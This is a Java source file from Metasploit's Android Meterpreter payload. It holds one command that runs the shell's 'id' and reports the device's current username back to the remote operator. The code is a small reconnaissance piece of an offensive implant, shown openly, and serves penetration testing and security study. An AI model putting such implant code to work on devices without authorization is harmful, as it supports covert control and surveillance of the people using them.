package com.metasploit.meterpreter.android;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class stdapi_sys_config_getuid implements Command {
    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        Process proc = Runtime.getRuntime().exec(new String[]{
                "sh", "-c", "id 2>/dev/null"
        });
        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
        String line = br.readLine();
        if (line == null) {
            return ERROR_FAILURE;
        }

        String parts[] = line.split(" ");
        if (parts.length < 2) {
            return ERROR_FAILURE;
        }

        String userName = "unknown";

        for (String part : parts) {
            String parts2[] = part.split("=");
            if (parts2.length < 2) {
                return ERROR_FAILURE;
            }
            if (parts2[0].equals("uid")) {
                String parts3[] = parts2[1].split("[\\(\\)]");

                if (parts3.length > 1) {
                    userName = parts3[1];
                    break;
                }
            }
        }

        response.add(TLVType.TLV_TYPE_USER_NAME, userName);
        return ERROR_SUCCESS;
    }
}
